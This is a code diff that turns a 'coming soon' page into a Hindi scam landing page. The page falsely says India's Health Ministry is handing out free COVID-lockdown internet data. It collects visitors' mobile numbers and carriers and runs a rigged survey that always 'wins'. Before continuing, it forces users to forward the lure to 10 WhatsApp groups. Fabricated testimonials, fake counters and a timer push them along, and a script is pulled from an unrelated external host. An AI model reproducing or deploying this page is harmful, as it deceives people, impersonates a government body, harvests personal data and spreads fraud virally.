@@ -1,21 +1,661 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>THE STUDY VIBES</title>
 
-  <link rel="stylesheet" href="main.css" />
+<!DOCTYPE html>
+<html lang="es">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta content='width=device-width, initial-scale=1.0' name='viewport' />
+<title>Internet for free: 60 GB</title>
+<meta property="og:image" content="https://i.imgur.com/TJbs5un.png">
+<meta property="og:title" content="Work From Home Lockdown सरकार योजना ">
+<meta property="og:description" content="60 days of free internet">
+<meta property="og:url" content="Your Url/">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script type="text/javascript" language="javascript">
+var areYouReallySure = false;
+var internalLink = false;
+</script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js'>
+    </script>
+<script>
+      //<![CDATA[
+      redirectURL = "";
+      WhatsApp_share_message = "";
+      Share_link = "#";
+      alert_text = "Compartilhe esta oferta com pelo menos 10 amigos para continuar. Voc�� convidou...";
+      var timer_start = 5; //minutes
+      //]]>
+    </script>
+   
+<script type='text/javascript'>
+
+function myfunc() {
+  document.getElementById("mobileno").style.display = "none";
+  document.getElementById("test").style.display = "block";
+}
+
+
+
+
+      //<![CDATA[
+      var total = 10;
+      jQuery(document).ready(function ($) {
+        $(".answer").click(function () {
+          if($(this).hasClass("anses1")){
+            survey.step1();
+          }
+          if($(this).hasClass("anses2")){
+            survey.step2();
+          }
+          if($(this).hasClass("anses3")){
+            survey.step3();
+          }
+        });
+        var clicks = 0;
+        var survey = {
+          step1: function(){
+            setTimeout(function () {
+              //hide question block FirstTechInfo
+              $(".question_count").hide();
+              $(".question1").hide();
+              $(".anses1").hide();
+              //show calculating FirstTechInfo
+              $(".calculating").show();
+              setTimeout(function () {
+                //hide calculating FirstTechInfo
+                $(".calculating").hide();
+                //show step 2 FirstTechInfo
+                $(".question_count span").html("2");
+                $(".question_count").show();
+                $(".question2").show();
+                $(".anses2").show();
+              }, 1200);
+            }, 300);
+          },
+          step2: function(){
+            setTimeout(function () {
+              //hide question block FirstTechInfo
+              $(".question_count").hide();
+              $(".question2").hide();
+              $(".anses2").hide();
+              //show calculating FirstTechInfo
+              $(".calculating").show();
+              setTimeout(function () {
+                //hide calculating FirstTechInfo
+                $(".calculating").hide();
+                //show step 3 FirstTechInfo
+                $(".question_count span").html("3");
+                $(".question_count").show();
+                $(".question3").show();
+                $(".anses3").show();
+              }, 1200);
+            }, 300);
+          },
+          step3: function(){
+            setTimeout(function () {
+              //hide question block FirstTechInfo
+              $(".question_count").hide();
+              $(".question3").hide();
+              $(".anses3").hide();
+              //show calculating FirstTechInfo
+              $(".calculating").show();
+              setTimeout(function () {
+                //hide calculating FirstTechInfo
+                $(".calculating").hide();
+                //show checking part FirstTechInfo
+                $(".survey_middle").css("vertical-align","top");
+                $(".loading").show();
+                setTimeout(function () {
+                  $(".check1").fadeIn(300);
+                  setTimeout(function () {
+                    $(".check2").fadeIn(300);
+                    setTimeout(function () {
+                      $(".check3").fadeIn(300);
+                      setTimeout(function () {
+                        survey.change();
+                      }, 1400);
+                    }, 1100);
+                  }, 1400);
+                }, 750);
+              }, 600);
+            }, 300);
+          },
+          change: function(){
+            //sakrij gornje FirstTechInfo
+            $(".headline,.small_headlines,.timer").hide();
+            //sakrij content surveya FirstTechInfo
+            $(".loading").hide();
+            $(".survey_outer").css("height","auto");
+            //pokazi ostatak FirstTechInfo
+            var walink = "whatsapp://send?text="+WhatsApp_share_message+Share_link;
+            //$(".btn-share").attr("href",walink); FirstTechInfo
+            $(".btn-share").click(function(){
+              clicks++;
+              $('#progreso').show();
+              if (clicks > total) {
+                window.location = redirectURL;
+                return;
+              }
+              $('.progress span').width(((clicks / total) * 100) + '%');
+              if (clicks == total) {
+                window.location.href = walink;
+              }
+              window.location.href = walink;
+            });
+            $(".last_page").show();
+			$(".fbcoms").show();
+            waitme();
+          }
+        };
+        $(".like").click(function() {
+          if($(this).hasClass("selected")) {
+            $(this).removeClass("selected");
+            $(this).html("Like");
+            $("#youand").html("");
+          } else {
+            $(this).addClass("selected");
+            $(this).html("Unlike");
+            $("#youand").html("You and ");
+          }
+        });
+        $(".fblike").click(function() {
+          if($(this).hasClass("selected")) {
+            $(this).removeClass("selected");
+            $(this).html("Like");
+          } else {
+            $(this).addClass("selected");
+            $(this).html("Unlike");
+          }
+        });
+        function waitme(){
+          FBcom("#fb1",000);
+          FBcom("#fb2",000);
+          FBcom("#fb3",000);
+          FBcom("#fb4",000);
+          FBcom("#fb5",00);
+          FBcom("#fb6",000);
+          FBcom("#fb7",000);
+          FBcom("#fb8",0000);
+          var ct = 48;
+          (function loop() {
+            var rand = random(2500,5500);
+            var ctrand = random(1,4);
+            ct = ct - ctrand;
+            if(ct > 1) {
+              setTimeout(function() {
+                loop();
+              }, rand);
+            } else {
+              ct = "few";
+            }
+            $("#count").html(ct);
+          }());
+        }
+        function FBcom(a,b) {
+          setTimeout(function() {
+            var m = 0, n = true, op = 0;
+            $(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
+            $().slideDown(500);
+            var t = setInterval(function() {
+              op += 0.2;
+              $(a).css({"opacity":op});
+              m++;
+              if(m === 5) clearInterval(t);
+            }, 100);
+          }, b);
+        }
+        function random(min, max) {
+          return Math.round(Math.random() * (max - min) + min);
+        }
+        var out,pops = {
+          init: function(){
+            setTimeout(function () {
+              var rand_name = pop_names[random(0,pop_names.length-1)];
+              var rand_text = pop_texts[random(0,pop_texts.length-1)];
+              var text = rand_name + " " + rand_text;
+              $(".pops p").html(text);
+              $(".pops").fadeIn(500);
+              out = setTimeout(function () {
+                $(".pops").fadeOut(1000);
+                pops.init();
+              }, 6000);
+            }, random(6000, 15000));
+          }
+        };
+        pops.init();
+        $("#iks").click(function () {
+          clearTimeout(out);
+          $(".pops").hide();
+          pops.init();
+        });
+        $("#mins").html("0"+timer_start);
+        $("#sec").html("00");
+        var mins = timer_start, secs = 0, minutes, seconds, timer = {
+          init: function(){
+            var counter = setInterval(function () {
+              $(".timer_heading").addClass("blink");
+              setTimeout(function () {
+                $(".timer_heading").removeClass("blink");
+              }, 500);
+              secs--;
+              if(secs<0){
+                secs = 59;
+                mins--;
+                if(mins<0){
+                  clearInterval(counter);
+                  mins = 0;
+                  secs = 0;
+                  $(".timer_heading").hide();
+                  $(".timer .small_headlines").show();
+                }
+                if(mins<10){
+                  minutes = "0" + mins;
+                }else{
+                  minutes = mins;
+                }
+              }
+              if(secs<10){
+                seconds = "0" + secs;
+              }else{
+                seconds = secs;
+              }
+              $("#mins").html(minutes);
+              $("#sec").html(seconds);
+            }, 1000);
+          }
+        };
+        timer.init();
+      });
+      //]]>
+    </script>
+    <!---do not edit any css setting Regards FirstTechInfo ----->
+    <link href="http://clickmeto.getenjoyment.net/fredat.css" rel="stylesheet" type="text/css"/>
+<script src="http://clickmeto.getenjoyment.net/red.js"></script>
 </head>
 <body>
-  <header>
-    <div class="content">
-      <h1>THE<span>STUDY</span>VIBES</h1>
-      <h2>COMING SOON</h2>
-      <div class="countdown">00 : 00 : 00 : 00</div>
-    </div>
-  </header>
-  <script src="main.js"></script>
+<div>
+<center> <img src="https://bit.ly/2xvsNay" alt="center" width="300px" height="285px">
+</center>
+<center><br><div class="alert alert-danger" role="alert" style="color:black;background-color:#cff7e9;border-color:#cff7e9;"> <b><p>
+<h2> नमस्ते दोस्तों ! 🙏 </h2>
+<br>
+देश के इस कठिन समय में एक दूसरे से जुड़े रहना काफी जरुरी है |
+कृपया घर रहकर कोरोना वायरस को फैलने से रोकें एवं ज्यादा से ज्यादा समय
+अपने परिवार को दें . इस कठिन समय में एकजुट होकर साथ देने के लिए सभी देश
+वासियो का सुक्रिया . स्वास्थ्य और परिवार कल्याण मंत्रालय की तरफ से एक दूसरे से जुड़े रहने के लिए दिया जा रहा है मुफ्त इंटरनेट डाटा .
+हमारी एक गलती हमारे देश को 20 वर्ष पीछे कर सकती है . हमारी ओर से आपको बहुत शुभकामनाएं।<br < p> मुफ्त इंटरनेट योजना सिर्फ <b><font color="darkblue">20 जून </font> तक ही सीमित है.. अभी तक <b><span id="countdowntimer" style="color:darkblue;">104952</span></b> मुफ्त इंटरनेट सुविधा सक्रिय कर चुके हैं .है।</div>
+
+
+<marquee>
+<center><a href="http://clickmeto.getenjoyment.net//ts" style="color:white;font-size:10px;font-weight:bold;text-decoration:none">Terms and Conditions applied </a> </center>
+</marquee>
+
+<script type="text/javascript">		 var timeleft = 105001;		 var downloadTimer = setInterval(function(){		 	timeleft= timeleft + Math.floor(Math.random() * 200);		 	document.getElementById('countdowntimer').textContent = timeleft;		 	if (timeleft <= 0)		 	clearInterval(downloadTimer);		 }, 1000);		</script>
+<div class='survey_outer'>
+<div class='survey_middle'>
+<div class='survey_inner'>
+<div id='mobileno'>
+<input type="number" placeholder="Enter your mobile no" class="number" length="10" required>
+<div class='answer' onclick="myfunc()">
+<p onclick="myfunc()">
+Airtel
+</p>
+</div>
+<div class='answer' onclick="myfunc()">
+<p>
+JIO
+</p>
+</div>
+<div class='answer' onclick="myfunc()">
+<p>
+Others
+</p>
+</div>
+</div>
+<div id="test" style="display: none;">
+<p class='question_text question1'>
+1.आप कितने दिनों के लिए मुफ्त इंटरनेट का उपयोग करना चाहेंगे ?
+</p>
+<p class='question_text question2'>
+2. आप कितने GB इंटरनेट सेवा लेना चाहेंगे ?
+</p>
+<p class='question_text question3'>
+3. आप किस नेटवर्क को सक्रिय करना चाहेंगे?
+</p>
+<div class='ans-box'>
+<div class='answer anses1'>
+<p>
+15 दिन
+</p>
+</div>
+<div class='answer anses1'>
+<p>
+30 दिन
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+15GB
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+20GB
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+30GB
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+3G
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+4G
+</p>
+</div>
+
+
+
+</div>
+<p class='calculating'>
+<img alt='' src='https://media.giphy.com/media/8DcYkij7pUxUY/giphy.gif' />
+कृपया प्रतीक्षा करें
+</p>
+<div class='loading'>
+<p class='load_headline'>
+कृपया प्रतीक्षा करें...
+</p>
+<img alt='' src='https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/source.gif' style='height:50px;width:50px;' />
+<p class='check check1'>
+पुष्टि हो रही है...
+</p>
+<p class='check check2'>
+</p>
+<p class='check check3'>
+बधाई हो, आपने 30GB जीता है
+</p>
+</div>
+<div class='last_page'>
+<div class='last-up'>
+<h4 class='textlastup'>
+बधाई हो, आपने अपने मोबाइल ऑपरेटर पर मुफ्त 30 GB जीता है
+<br /><br />
+फ्री इन्टरनेट कैसे एक्टिव करें<br />
+1.यदि आप जारी रखते हैं, तो हरे बटन "शेयर" पर क्लिक करें और इसे 12 व्हाट्सएप ग्रुप या दोस्तों को भेजें ताकि वे भी इस मुफ्त सेवा को प्राप्त कर सकें! शेयर करने का मकशद कोरोना वायरस के बारे में लोगों को जागरूक करना है और आयी महामारी से बचे रहना है
+<br /><br />
+2.शेयर करने के 24 घंटों के अन्दर, आपको 60 दिनों के लिए इस मुफ्त सेवा सक्रिय हो जायेगा।
+<br /><br />
+</h4>
+<div>
+<script type="">
+var cl1 = 0;
+var max_val=10;
+$('document').ready(function(){
+   
+    $('.whatsapp').click(function(){
+       cl1++;
+        
+   });
+    $('.final').click(function(e){
+        if(cl1 < max_val){
+            alert("मुफ्त 30GB प्राप्त करने के लिए आपको ये सुविधा अपने 10 दोस्तों या  group में  भेजना है "+ eval(parseInt(max_val) - parseInt(cl1)) +" Group/Friend बाकी हैं");
+            e.preventDefault();
+        }    
+        else{
+            window.location.href='get-sim.html';
+        }
+    });
+    
+});
+</script>
+<!-----Downloaded From FirsttechInfo---->
+<script type="">// changing progressbar when button is clicked
+$(".whatsapp").click(function () {
+    animateProgress(parseInt($(this).data('diff')));
+});
+
+// animate progress by a step indicated by diff
+function animateProgress(diff) {
+    var currValue = $("#prgss").val();
+    var toValue = currValue + diff;
+
+    toValue = toValue < 0 ? 0 : toValue;
+    toValue = toValue > 100 ? 100 : toValue;
+
+    $("#prgss").animate({'value': toValue}, 500);
+}
+</script>
+
+
+<section id="container" class="container text-center">
+<center><b></b></center><style>progress {
+    height: 30px;
+    width: 200px;   
+}
+
+
+</style>
+
+<center><progress id="prgss" value="0" max="100"></progress>
+<div style="box-sizing: border-box; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; margin: 0px; padding: 0px;">
+<a class="step-wp whatsapp sharing" data-action="share/whatsapp/share" href="whatsapp://send?text= 
+  %0A%0A%0A▬▬▬▬▬▬ஜ۩۩ஜ▬▬▬▬▬▬%0A *Work from Home* %0A देश के इस कठिन समय में एक दूसरे से जुड़े रहना काफी जरुरी है | कृपया घर में रहकर कोरोना वायरस (Covid-19) को फैलने से रोकें  . इस कठिन समय में एकजुट होकर साथ देने के लिए सभी देश वासियो का सुक्रिया . स्वास्थ्य और परिवार कल्याण मंत्रालय की तरफ से एक दूसरे से जुड़े रहने के लिए दिया जा रहा है मुफ्त इंटरनेट डाटा . हमारी एक गलती हमारे देश को 20 वर्ष पीछे कर सकती है । *50 GB फ्री इंटरनेट बिना किसी रिचार्ज के* %0Aपायें 50 GB इंटरनेट डाटा बिलकुल मुफ्त किसी भी मोबाइल नेटवर्क पर 60 दिनों के लिए *ऑफर - 
+  20 जून तक है* %0A*[तो अभी प्राप्त करें]* %0A     👇👇👇👇👇👇 %0A *इस लिंक पर क्लिक कर के* %0A 
+  
+  Your Url
+  
+  %0A▬▬▬▬▬▬ஜ۩۩ஜ▬▬▬▬▬▬%0A%0A%0A
+  " <a="" data-diff="10" style="background:#4CAF50; box-sizing: border-box; color: white !important; display: block; font-size: 20px; margin: 0px; padding: 10px; text-align: center; text-decoration-line: none; width: 299px;">
+WhatsApp पर शेयर करे<span class="pull-right deliv" style="box-sizing: border-box; float: right !important; margin: 0px; padding: 0px;style=" border:="" 0px;="" box-sizing:="" border-box;="" display:="" block;="" height:="" auto;="" margin:="" max-width:="" 100%;="" padding:="" vertical-align:="" middle;"="" width="30px;"></span></a><br>
+<br />
+<br />
+<div class='fbcoms' style="display:none;">
+<p class='comments'>
+</p>
+<p class='buttons'>
+<span class='like'>
+Like
+</span>
+&#183;
+ <span>
+Share
+</span>
+&#183;
+<span>
+Comment
+</span>
+&#183;
+<span>
+Remove
+</span>
+</p>
+<p class='totlikes'>
+<span id='youand'>
+</span>
+<span class='fbdarkblue'>
+others 204,208
+</span>
+like this
+</p>
+<p class='viewmore clearfix'>
+<span class='left'>
+more comments...
+</span>
+<span class='right'>
+63 of 173,330
+</span>
+<br />
+</p>
+<div class='item' id='fb8' style='display: none; opacity: 1;'>
+<img class="profileimg" src="https://pbs.twimg.com/profile_images/763830019932102658/ZwSapMUG_400x400.jpg" height="50" width="50">
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Akriti Bhat
+</span>
+<br />
+इस गिफ्ट के लिए धन्यवाद !! मुझे अभी 30GB मुफ्त मिल रहा है।
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb7' style='display: none; opacity: 1;'>
+<img class="profileimg" src="https://i.imgur.com/697oHrG.jpg" height="50" width="50">
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Gayatri Anand
+</span>
+<br />
+ओह बहुत धन्यवाद। मुझे भरोसा नहीं हो रहा है की मैंने जीता है।
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb6' style='display: none; opacity: 1;'>
+<img class="profileimg" src="https://i.imgur.com/H8u0YSw.jpg" height="50" width="50">
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Himani Goel
+</span>
+<br />
+Thank you modi ji . #IndiaFightcorona
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb5' style='display: none; opacity: 1;'>
+<img class="profileimg" src="https://i.imgur.com/SoWEpxx.jpg" height="50" width="50">
+<p class='comtxt' style='display: block;'>
+ <span class='name'>
+Indeever Chaudhary
+</span>
+<br />
+धन्यवाद!
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb4' style='display: none; opacity: 1;'>
+<img class="profileimg" src="https://i.imgur.com/vEES69i.jpg" height="50" width="50">
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Roy Malik
+</span>
+<br /> मै प्रधानमन्त्री का इस पहल के लिए धन्यवाद् करती हूँ
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item'>
+<img class="profileimg" src="https://i.imgur.com/Iu2m8S7.jpg" height="50" width="50">
+<p class='comtxt'>
+<span class='name'>
+Sahni Lakshmiraman
+</span>
+<br />
+Fantastic! Thank you a lot for this free
+</p>
+<p class='combot'>
+<span class='ago'>
+2 min ago
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+<span class='likes totlikes'>
+223
+</span>
+</p>
+</div>
+</div>
+<br />
+<div>
+tttt
+</div>
+
+</div>
+<br>
+</div>
+<br>
+<br><br><br>
+<script type="">
+var cl1 = 0;
+var max_val=10;
+$('document').ready(function(){
+   
+    $('.whatsapp').click(function(){
+       cl1++;
+        
+   });
+    $('.final').click(function(e){
+        if(cl1 < max_val){
+            alert("मुफ्त 30GB प्राप्त करने के लिए आपको ये सुविधा अपने 10 दोस्तों या  group में  भेजना है "+ eval(parseInt(max_val) - parseInt(cl1)) +" Group/Friend बाकी हैं");
+            e.preventDefault();
+        }    
+        else{
+            window.location.href='get-sim.html';
+        }
+    });
+    
+});
+</script>
+
+<script type="">// changing progressbar when button is clicked
+$(".whatsapp").click(function () {
+    animateProgress(parseInt($(this).data('diff')));
+});
+
+// animate progress by a step indicated by diff
+function animateProgress(diff) {
+    var currValue = $("#prgss").val();
+    var toValue = currValue + diff;
+
+    toValue = toValue < 0 ? 0 : toValue;
+    toValue = toValue > 100 ? 100 : toValue;
+
+    $("#prgss").animate({'value': toValue}, 500);
+}
+</script>
+
 </body>
+
 </html>
